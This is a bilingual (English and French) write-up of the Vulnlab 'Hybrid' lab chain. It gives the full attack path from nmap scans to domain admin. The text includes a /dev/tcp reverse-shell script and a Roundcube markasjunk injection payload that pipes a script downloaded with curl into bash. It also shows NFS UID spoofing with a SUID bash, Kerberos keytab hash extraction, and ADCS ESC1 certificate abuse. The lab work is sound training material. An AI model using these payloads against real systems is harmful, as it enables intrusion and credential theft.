---
title: Vulnlab Hybrid Machine
date: 2025-11-01 00:00:00 +0000
categories: [WRITUPS, ACTIVE DIRECTORY]
tags: [activedirectory, vulnerability, roundcube]
---

# HYBRID MACHINES

[https://api.vulnlab.com/api/v1/share?id=aa8002ff-d860-4bcb-b72b-71a46bc943fa](https://api.vulnlab.com/api/v1/share?id=aa8002ff-d860-4bcb-b72b-71a46bc943fa)

`10.10.250.85`
`10.10.250.86`

## Network Mapping

ðŸš© IPS may change, but the concept remains the same. 

We start by scanning both IP addresses to see what we can find that is interesting.

machine 1 :  `10.10.250.85`

```bash
# nmap -sC -sV -p- -T4 -vv -oN nmap1_all 10.10.250.85
Nmap scan report for 10.10.250.85
Host is up, received echo-reply ttl 127 (0.19s latency).
Scanned at 2025-06-28 15:43:39 EDT for 524s
Not shown: 65513 filtered tcp ports (no-response)
PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-06-28 19:50:56Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: hybrid.vl0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=dc01.hybrid.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc01.hybrid.vl
| Issuer: commonName=hybrid-DC01-CA/domainComponent=hybrid
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-06-28T19:34:07
| Not valid after:  2026-06-28T19:34:07
| MD5:   005c:b623:232b:4f53:a4bf:efb7:b982:c0e9
| SHA-1: d2ea:a508:c68b:5bec:211a:2b90:2c8c:0bfe:6
............................
```

Machine 2 :  `10.10.250.86`

```bash
#nmap -sV -sC -T4 -p- -vv -oN nmap2_all 10.10.250.86
Increasing send delay for 10.10.214.230 from 5 to 10 due to 11 out of 11 dropped probes since last increase.
Warning: 10.10.214.230 giving up on port because retransmission cap hit (6).
Nmap scan report for 10.10.214.230
Host is up, received echo-reply ttl 63 (0.19s latency).
Scanned at 2025-06-28 15:45:13 EDT for 1179s
Not shown: 65481 closed tcp ports (reset)
PORT      STATE    SERVICE      REASON         VERSION
22/tcp    open     ssh          syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 60:bc:22:26:78:3c:b4:e0:6b:ea:aa:1e:c1:62:5d:de (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLl+dlYZiceVG9g/8U0XSs4cWJ/6msyXPI/mORr9T9i4oQA66eYZSYwrxEwYwDZvrhXu7foZtEdeu3u6uSUnl4k=
|   256 a3:b5:d8:61:06:e6:3a:41:88:45:e3:52:03:d2:23:1b (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILJyLrRGDcNfa9bQg1dhsV/CPQapLeRxpWJDUOQ+MI1c
25/tcp    open     smtp         syn-ack ttl 63 Postfix smtpd
|_smtp-commands: mail01.hybrid.vl, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, AUTH PLAIN LOGIN, ENHANCEDSTATUSCODES, 8BITMIME, DSN, CHUNKING
80/tcp    open     http         syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-title: Redirecting...
110/tcp   open     pop3         syn-ack ttl 63 Dovecot pop3d
| ssl-cert: Subject: commonName=mail01
| Subject Alternative Name: DNS:mail01
| Issuer: commonName=mail01
.................................
_ssl-date: TLS randomness does not represent time
|_pop3-capabilities: STLS RESP-CODES AUTH-RESP-CODE UIDL SASL TOP PIPELINING CAPA
111/tcp   open     rpcbind      syn-ack ttl 63 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
| ..................... ( Il y'a une suite)
```

## Enumeration.

We note that we are dealing with an Active Directory network (Machine 1: 53.88.135.139.389) and a mail server (Machine 2: 10.10.250.86). 

If we consult the web page, we notice that the server has a Roundcube email client, which requests login credentials. After some enumeration, we notice that there is an NFS server that we will try to enumerate.

```bash
showmount -e 10.10.250.86
Export list for 10.10.250.86:
/opt/share *
```

We assemble it locally. 

```bash
mount -t nfs 10.10.250.86:/opt/share /tmp/share
```

## Initial Access

We start listing to see if we can find any interesting files.
We find identification files in `etc/dovecot/dovecot-users`.

```bash
â”Œâ”€â”€(rootã‰¿kali)-[/tmp/share]
â””â”€# cat etc/dovecot/dovecot-users
admin@hybrid.vl:{plain}Duckling21
peter.turner@hybrid.vl:{plain}PeterIstToll!
```

Nous les utilisons pour nous connecter au client de messagerie

Nous voyons ce mail a nous connectant avec peter.turner@hybrid.vl

![Desktop View](/assets/img/sample/Hybrid.png){: .normal }

Encore une petite enumeration

![Desktop View](/assets/img/sample/Hybrid-1.png){: .normal }

The markasjunk plugin is vulnerable to exploitation. A vulnerability in Roundcube's markasjunk plugin allows attackers who send a specially crafted email address to cause the plugin to execute arbitrary code. 

[SSD Advisory - Â Roundcube markasjunk RCE - SSD Secure Disclosure](https://ssd-disclosure.com/ssd-advisory-roundcube-markasjunk-rce/)

we create a bash file with this content â€œ: 

```bash
â”Œâ”€â”€(rootã‰¿kali)-[~/Vulnlab/chains/Hybrid]
â””â”€# cat s.sh                  
bash -c 'exec bash -i &>/dev/tcp/10.8.6.184/4444 <&1'
                                                                                                                                                                                             
â”Œâ”€â”€(rootã‰¿kali)-[~/Vulnlab/chains/Hybrid]
â””â”€# 
```

We create a listener with the command `nc -nlvp 4444`
And we use this payload, which we will inject into the destination part 

```bash
peter.turner&curl${IFS}10.8.6.184/s.sh${IFS}|${IFS}bash&@hybrid.vl
```

![Desktop View](/assets/img/sample/Hybrid-2.png){: .normal }

Once we're done with the listener, we'll get a shell. 

```bash
â”Œâ”€â”€(rootã‰¿kali)-[~/â€¦/chains/Hybrid/etc/dovecot]
â””â”€# rlwrap nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.8.6.184] from (UNKNOWN) [10.10.250.86] 33382
bash: cannot set terminal process group (638): Inappropriate ioctl for device
bash: no job control in this shell
www-data@mail01:~/roundcube$ 
```

## Privilege Escalation

We notice that there is a user: peter.turner@hybrid.vl, on the machine, to which the user www-data does not have access, so we will try to elevate our privileges.

We're going to abuse the NFS setup. 

ðŸš© We note that in the setup created by our machine, a file created by our user on our attacking machine is mapped to the target machine, with the user who created it, as follows:

- Sur la machine attaquante, nous crÃ©ons un fichier test.txt, avec lâ€™utilisateur kali

```bash
xrwxr-x  5 nobody                 nogroup                   4096 Jul  7 10:42 etc
drwxrwxr-x  3 nobody                 nogroup                   4096 Jul  7 10:42 opt
-rw-rw-r--  1 kali                   kali                         0 Jul  7 12:16 test.txt

```

- On the attacking machine, we notice the following

```bash
rwxrwxr-x 5 nobody                 nogroup    4096 Jul  7 14:42 etc
drwxrwxr-x 3 nobody                 nogroup    4096 Jul  7 14:42 opt
-rw-rw-r-- 1                   1000    1000       0 Jul  7 16:16 test.txt

```

Our Kali user is mapped to 1000 on the attacking machine.

ðŸš©What we want to try to do. We want to hijack the user peter.turner@hybrid.vl located on the target machine by creating the same user with the same ID as the target machine on our attacking machine and executing a bash shell under that name, all within the mount point. 

1- Create a user named peter.turner@hybrid.vl on our attacking machine with the same user ID as on the target machine. 

```bash
# Machine cible
bash-5.1$ id petid peter.turner@hybrid.vl
id peter.turner@hybrid.vl
uid=902601108(peter.turner@hybrid.vl) gid=902600513(domain users@hybrid.vl) groups=902600513(domain users@hybrid.vl),902601104(hybridusers@hybrid.vl)
```

id : 902601108

- On our attacking machine

```bash
sudo adduser peter.turner@hybrid.vl
sudo sed -i -e 's/1002/902601108/g' /etc/passwd
```

- Next, we copy the original bash binary to share (as www-data).

```bash
cp /usr/bin/bash .
```

- On our attacking machine, we copy bash to tmp, delete bash from the share, and copy it back to the share as peter.turner@hybrid.vl. Finally, we set the suid identifier.

```bash
cp bash /tmp/
cp /tmp/bash .
chmod +xs bash
```

- On our attacking machine, we log in with the userpeter.turner@hybrid.vl

```bash
bash-5.1$ /opt/share/bash -p 
/opt/share/bash -p 
bash-5.1$ id 
uid=33(www-data) gid=33(www-data) euid=902601108(peter.turner@hybrid.vl) egid=1001 groups=1001,33(www-data)
bash-5.1$ ls 
flag.txt  passwords.kdbx
bash-5.1$ 

```

I transferred the passwords.kdbx file to my local machine and tried to access it.

![Desktop View](/assets/img/sample/Hybrid-3.png){: .normal }

Nous voyns que le fichier est protÃ©gÃ© par un mot de passe, jâ€™ai essayÃ© de le cracker mais je suis ressortis sans resultat.  Et avec ce mot de passe Ã©numÃ©rÃ© plus haut PeterIstToll!, jâ€™ai pu avoir un acces.

![Desktop View](/assets/img/sample/Hybrid-4.png){: .normal }

The file gives us access to credentials that we can try to use. With `Crackmapexec`, let's try to confirm the validity of these credentials, and we see that they are valid.

```bash
â”Œâ”€â”€(rootã‰¿kali)-[~/Vulnlab/chains/Hybrid]
â””â”€# crackmapexec smb 10.10.182.117 -u 'peter.turner' -p 'b0cwR+G4Dzl_rw'                                                                                                     
SMB         10.10.182.117   445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:hybrid.vl) (signing:True) (SMBv1:False)
SMB         10.10.182.117   445    DC01             [+] hybrid.vl\peter.turner:b0cwR+G4Dzl_rw
```

Let's try to list the users

```bash
â”€# crackmapexec smb 10.10.182.117 -u 'peter.turner' -p 'b0cwR+G4Dzl_rw' --users       
SMB         10.10.182.117   445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:hybrid.vl) (signing:True) (SMBv1:False)
SMB         10.10.182.117   445    DC01             [+] hybrid.vl\peter.turner:b0cwR+G4Dzl_rw 
SMB         10.10.182.117   445    DC01             [+] Enumerated domain user(s)
SMB         10.10.182.117   445    DC01             hybrid.vl\Margaret.Shepherd              badpwdcount: 0 desc: 
SMB         10.10.182.117   445    DC01             hybrid.vl\Kathleen.Walker                badpwdcount: 0 desc: 
SMB         10.10.182.117   445    DC01             hybrid.vl\Emily.White                    badpwdcount: 0 desc: 
SMB         10.10.182.117   445    DC01             hybrid.vl\Elliot.Watkins                 badpwdcount: 0 desc: 
SMB         10.10.182.117   445    DC01             hybrid.vl\Ricky.Myers                    badpwdcount: 0 desc: 
SMB         10.10.182.117   445    DC01             hybrid.vl\Olivia.Smith                   badpwdcount: 0 desc: 
SMB         10.10.182.117   445    DC01             hybrid.vl\Peter.Turner                   badpwdcount: 0 desc: 
SMB         10.10.182.117   445    DC01             hybrid.vl\Josh.Mitchell                  badpwdcount: 0 desc: 
SMB         10.10.182.117   445    DC01             hybrid.vl\Pamela.Smith                   badpwdcount: 0 desc: 
SMB         10.10.182.117   445    DC01             hybrid.vl\Edward.Miller                  badpwdcount: 0 desc: 
SMB         10.10.182.117   445    DC01             hybrid.vl\krbtgt                         badpwdcount: 0 desc: Key Distribution Center Service Account
SMB         10.10.182.117   445    DC01             hybrid.vl\Guest                          badpwdcount: 0 desc: Built-in account for guest access to the computer/domain
SMB         10.10.182.117   445    DC01             hybrid.vl\Administrator                  badpwdcount: 0 desc: Built-in account for administering the computer/domain

```

- We did the same thing with the groups, but we didn't find anything interesting.
- We tried enumeration with Bloodhound, but I didn't find anything interesting.
- Finally, I tried to gain access to the mail server.

## Lateral movement

We noticed earlier that the mail server had an accessible SSH port 22.
Using the credentials found in the password manager, we were able to access the mail server via SSH.

```bash
â”Œâ”€â”€(rootã‰¿kali)-[/opt]
â””â”€# ssh peter.turner@hybrid.vl@10.10.182.118
(peter.turner@hybrid.vl@10.10.182.118) Password: 
Welcome to Ubuntu 22.04.2 LTS (GNU/Linux 5.15.0-75-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Tue Jul  8 10:05:13 PM UTC 2025
```

Let's try a quick list. With this bad configuration, we can run any command as the root user. We can abuse this feature to elevate our privileges. 

```bash
peter.turner@hybrid.vl@mail01:~$ sudo -l
Matching Defaults entries for peter.turner@hybrid.vl on mail01:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User peter.turner@hybrid.vl may run the following commands on mail01:
    (ALL) ALL
```

```bash
peter.turner@hybrid.vl@mail01:~$ sudo su
root@mail01:/home/peter.turner@hybrid.vl# id
uid=0(root) gid=0(root) groups=0(root)
root@mail01:/home/peter.turner@hybrid.vl#
```

- After several attempts with Bloodhound and everything else, I came up empty-handed. So let's see if we can exploit a certificate template.

```bash
â”Œâ”€â”€(rootã‰¿kali)-[~]
â””â”€# certipy-ad find -u peter.turner -p 'b0cwR+G4Dzl_rw' -dc-ip 10.10.182.117 -vulnerable -enabled                             
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 34 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 12 enabled certificate templates
[*] Trying to get CA configuration for 'hybrid-DC01-CA' via CSRA

```

Further down in the response, we have this result that we will try to exploit.

```bash
Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Validity Period                     : 100 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 4096
    Permissions
      Enrollment Permissions
        Enrollment Rights               : HYBRID.VL\Domain Admins
                                          HYBRID.VL\Domain Computers
                                          HYBRID.VL\Enterprise Admins
      Object Control Permissions
        Owner                           : HYBRID.VL\Administrator
        Write Owner Principals          : HYBRID.VL\Domain Admins
                                          HYBRID.VL\Enterprise Admins
                                          HYBRID.VL\Administrator
        Write Dacl Principals           : HYBRID.VL\Domain Admins
                                          HYBRID.VL\Enterprise Admins
                                          HYBRID.VL\Administrator
        Write Property Principals       : HYBRID.VL\Domain Admins
                                          HYBRID.VL\Enterprise Admins
                                          HYBRID.VL\Administrator
    [!] Vulnerabilities
      ESC1                              : 'HYBRID.VL\\Domain Computers' can enroll, enrollee supplies subject and template allows client authentication

```

- Let's do some research to list the users of the Domain Computers group.
- We return to Bloodhound to see.

![Desktop View](/assets/img/sample/Hybrid-5.png){: .normal }

Avons nous les identifiant de MAIL01 ?

- Deja la machine auquelle nous avons acces par ssh, est le mail01

```bash
root@mail01:/home/peter.turner@hybrid.vl# hostname
mail01
root@mail01:/home/peter.turner@hybrid.vl# 
```

- Can we find the login details and password for the mail01$ account?
           -  Possible, since we are root, let's try some enumeration.

```bash
root@mail01:/home/peter.turner@hybrid.vl# cat /etc/krb5.keytab 
7       HYBRID.VLMAIL01$dï¿½ï¿½ï¿½lRFï¿½ï¿½{ï¿½]ï¿½ï¿½mWï¿½7      HYBRID.VLMAIL01$dï¿½ï¿½:s$Tï¿½[ï¿½ï¿½){kï¿½GdXG     HYBRID.VLMAIL01$dï¿½ï¿½ ï¿½Æ´ï¿½cï¿½ï¿½ï¿½Ooï¿½6ï¿½pï¿½ï¿½ï¿½Aï¿½ï¿½ï¿½@#PÓ¶'.Cmn<      HYBRID.VLhostMAIL01dï¿½ï¿½ï¿½lRFï¿½ï¿½{ï¿½]ï¿½ï¿½mWï¿½<   HYBRID.VLhostMAIL01dï¿½ï¿½:s$Tï¿½[ï¿½ï¿½){kï¿½GdXL       HYBRID.VLhostMAIL01dï¿½ï¿½ ï¿½Æ´ï¿½cï¿½ï¿½ï¿½Ooï¿½6ï¿½pï¿½ï¿½ï¿½Aï¿½ï¿½ï¿½@#PÓ¶'.CmnI   HYBRID.VLRestrictedKrbHostMAIL01dï¿½ï¿½ï¿½lRFï¿½ï¿½{ï¿½]ï¿½ï¿½mWï¿½I      HYBRID.VLRestrictedKrbHostMAIL01dï¿½ï¿½:s$Tï¿½[ï¿½ï¿½){kï¿½GdXY  HYBRID.VLRestrictedKrbHostMAIL01dï¿½ï¿½ ï¿½Æ´ï¿½cï¿½ï¿½ï¿½Ooï¿½6ï¿½pï¿½ï¿½ï¿½Aï¿½ï¿½ï¿½@#PÓ¶'.Cmnroot@mail01:/home/peter.turner@hybrid.vl# 
```

We have read access to the krb5.keytab file, which we can send to our machine and extract the identification information with: **KeyTabExtract, which can be found in this GitHub repository**. 

[https://github.com/sosdave/KeyTabExtract](https://github.com/sosdave/KeyTabExtract)

```bash
â”Œâ”€â”€(rootã‰¿kali)-[/opt/KeyTabExtract]
â””â”€# python keytabextract.py ~/Vulnlab/chains/Hybrid/krb5.keytab            
[*] RC4-HMAC Encryption detected. Will attempt to extract NTLM hash.
[*] AES256-CTS-HMAC-SHA1 key found. Will attempt hash extraction.
[*] AES128-CTS-HMAC-SHA1 hash discovered. Will attempt hash extraction.
[+] Keytab File successfully imported.
        REALM : HYBRID.VL
        SERVICE PRINCIPAL : MAIL01$/
        NTLM HASH : 0f916c5246fdbc7ba95dcef4126d57bd
        AES-256 HASH : eac6b4f4639b96af4f6fc2368570cde71e9841f2b3e3402350d3b6272e436d6e
        AES-128 HASH : 3a732454c95bcef529167b6bea476458
```

Let's try using these credentials to request a certificate on behalf of a highly privileged user who is in the Administrators group: **EDWARD.MILLER@HYBRID.VL**

![Desktop View](/assets/img/sample/Hybrid-6.png){: .normal }

```bash
â””â”€# certipy-ad req -u 'MAIL01$' -hashes :0f916c5246fdbc7ba95dcef4126d57bd -dc-ip 10.10.182.117 -ca hybrid-DC01-CA -target 'dc01.hybrid.vl' -template HybridComputers -upn 'EDWARD.MILLER@HYBRID.VL' -key-size 4096 -debug
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[+] Trying to resolve 'dc01.hybrid.vl' at '10.10.182.117'
[+] Generating RSA key
[*] Requesting certificate via RPC
[+] Trying to connect to endpoint: ncacn_np:10.10.182.117[\pipe\cert]
[+] Connected to endpoint: ncacn_np:10.10.182.117[\pipe\cert]
[*] Successfully requested certificate
[*] Request ID is 13
[*] Got certificate with UPN 'EDWARD.MILLER@HYBRID.VL'
[*] Certificate has no object SID
[*] Saved certificate and private key to 'edward.miller.pfx'

```

We obtain a private certificate from edward.miller, which we can use to access the service on his behalf.

```bash
â”Œâ”€â”€(rootã‰¿kali)-[~/Vulnlab/chains/Hybrid]
â””â”€# certipy-ad auth -pfx edward.miller.pfx -dc-ip 10.10.182.117
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Using principal: edward.miller@hybrid.vl
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'edward.miller.ccache'
[*] Trying to retrieve NT hash for 'edward.miller'
[*] Got hash for 'edward.miller@hybrid.vl': aad3b435b51404eeaad3b435b51404ee:eb443f42f6410f2494b401d22457549d

```

We can then use it to connect with evil-winrm

```bash
â”Œâ”€â”€(rootã‰¿kali)-[~/Vulnlab/chains/Hybrid]
â””â”€# evil-winrm -i 10.10.182.117  -u 'edward.miller'  -H eb443f42f6410f2494b401d22457549d
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Edward.Miller\Documents> cd ..
*Evil-WinRM* PS C:\Users\Edward.Miller> cd ..
*Evil-WinRM* PS C:\Users> cd Administrator
*Evil-WinRM* PS C:\Users\Administrator> cd Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> more root.txt
VL{***************************}

*Evil-WinRM* PS C:\Users\Administrator\Desktop> 
```